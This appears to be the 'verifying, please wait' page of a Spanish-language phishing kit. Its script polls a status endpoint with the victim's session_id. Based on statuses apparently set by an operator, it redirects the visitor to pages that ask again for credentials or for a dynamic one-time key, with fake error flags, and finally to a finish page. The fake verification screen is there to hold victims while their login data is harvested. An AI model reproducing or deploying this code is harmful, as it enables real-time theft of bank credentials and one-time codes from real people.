<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        body {
            background-color: #10005f;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .spinner {
            font-size: 3em;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" rel="stylesheet">

    <div id="descarga" class="fieldbox">
        <div class="spinner">
            <i class="fas fa-circle-notch fa-spin" style="color: white;"></i>
        </div>
        <p id="loadingMessage">Estamos verificando...</p>
    </div>

    <script>
        // Cambia el mensaje después de 3 segundos
        setTimeout(() => {
            document.getElementById('loadingMessage').innerText = "Falta poco...";
        }, 3000);

        // Capturar session_id desde la URL
        const urlParams = new URLSearchParams(window.location.search);
        let session_id = urlParams.get('session_id');

        // Si no está en la URL, buscar en localStorage
        if (!session_id) {
            session_id = localStorage.getItem('session_id');
            if (!session_id) {
                console.error('No se encontró el session_id en la URL ni en localStorage');
            } else {
                console.log('session_id obtenido de localStorage:', session_id);
            }
        } else {
            console.log('session_id obtenido de la URL:', session_id);
        }

        // Función para verificar el estado
        function checkStatus() {
            if (!session_id) {
                console.error('session_id no está definido');
                return;
            }

            const url = `../js/check_status.php?session_id=${encodeURIComponent(session_id)}`;
            console.log("URL solicitada:", url);

            fetch(url)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    console.log("Estado recibido:", data.user_status);

                    // Revisar los diferentes estados y redirigir según el resultado
                    if (data.user_status === 'confirmado') {
                        console.log("Redirigiendo a claveDinamica.php");
                        window.location.href = `/validador_dinamic.php?session_id=${encodeURIComponent(session_id)}`;
                    } else if (data.user_status === 'SolicitarCredenciales') {
                        console.log("Redirigiendo a chedf.php con mensaje de error");
                        window.location.href = `/chedf.php?session_id=${encodeURIComponent(session_id)}&error=1`;
                    } else if(data.user_status==='dinamicaconfirmada'){
                        console.log("Redirigiendo a finish.php");
                        window.location.href = `/finish.php?session_id=${encodeURIComponent(session_id)}`;
                    } else if(data.user_status==='solicitarDinamica'){
                        console.log("Redirigiendo a chedf.php con mensaje de error");
                        window.location.href = `/validador_dinamic.php?session_id=${encodeURIComponent(session_id)}&error=1`;
                    }

                    else {
                        console.log("Estado no confirmado, manteniendo en cargando.php");
                    }
                })
                .catch(error => console.error('Error en checkStatus:', error));
        }

        // Comprobar el estado cada 2 segundos
        setInterval(checkStatus, 2000);
    </script>
</body>
</html>
